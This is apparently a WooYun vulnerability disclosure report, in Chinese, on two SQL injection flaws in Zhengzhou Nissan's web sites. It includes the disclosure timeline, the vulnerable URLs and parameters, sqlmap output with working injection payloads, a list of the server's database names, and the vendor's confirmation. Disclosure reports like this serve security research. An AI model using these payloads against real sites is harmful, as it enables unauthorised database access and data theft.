wybug_title: 郑州日产主站存在SQL注入两枚
wybug_corp: 郑州日产汽车有限公司
wybug_detail:
漏洞详情 披露状态：   									2015-11-25：	细节已通知厂商并且等待厂商处理中									2015-11-27：	厂商已经确认，细节仅向厂商公开									2015-12-07：	细节向核心白帽子及相关领域专家公开									2015-12-17：	细节向普通白帽子公开									2015-12-27：	细节向实习白帽子公开									2016-01-11：	细节向公众公开  简要描述： ：） 详细说明：  http://www.zznissan.com.cn/dongfengfengdu/buy/online_read.php?id=8
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: id=8 RLIKE (SELECT (CASE WHEN (8580=8580) THEN 8 ELSE 0x28 END))    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=8 AND (SELECT 6641 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (CASE WHEN (6641=6641) THEN 1 ELSE 0 END)),0x716a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 4 columns    Payload: id=-1161 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b7a7671,0x5977594b617a566b494c,0x716a767a71)#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: id=-7189 OR 2739=SLEEP(5)---[14:56:16] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL 5.0[14:56:16] [INFO] fetching database namesavailable databases [41]:                                                      [*] club_15[*] ebuy[*] ebuy1217[*] events[*] events_2014cgr[*] events_2014five[*] events_pickupStory[*] ezznissan[*] information_schema[*] innodb[*] jinzhiwen[*] maintain[*] mysql[*] nissan[*] nissan_2015cgr[*] nissan_jxs[*] nissan_patrol[*] nissanmedia[*] nissantest[*] paladin[*] paladinclub[*] paladinclubtemp[*] palaqi[*] performance_schema[*] specialcar[*] test[*] topic[*] tower_15[*] wqw_five[*] wqw_mx6gc[*] wqw_succk[*] xuhui[*] yaguan[*] zznissan[*] zznissan_eng[*] zznissan_jnds[*] zznissan_lms2015[*] zznissan_mx6sj2015[*] zznissan_mx6tg2015[*] zznissan_pro[*] zznissanbak
http://guangzhou.zznissan.com.cn/deal_apply.php?height=350;width=560&jxs=1跟上一个数据库一样
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: jxs (GET)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: height=350;width=560&jxs=1 RLIKE (SELECT (CASE WHEN (9090=9090) THEN 1 ELSE 0x28 END))    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: height=350;width=560&jxs=1 AND (SELECT 2592 FROM(SELECT COUNT(*),CONCAT(0x7162707a71,(SELECT (CASE WHEN (2592=2592) THEN 1 ELSE 0 END)),0x71626a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 1 column    Payload: height=350;width=560&jxs=1 UNION ALL SELECT CONCAT(0x7162707a71,0x77704957776d456b4d68,0x71626a7671)#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: height=350;width=560&jxs=-7485 OR 3521=SLEEP(5)---[15:33:10] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL 5.0

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-11-27 15:59 厂商回复： 已收到 最新状态： 暂无
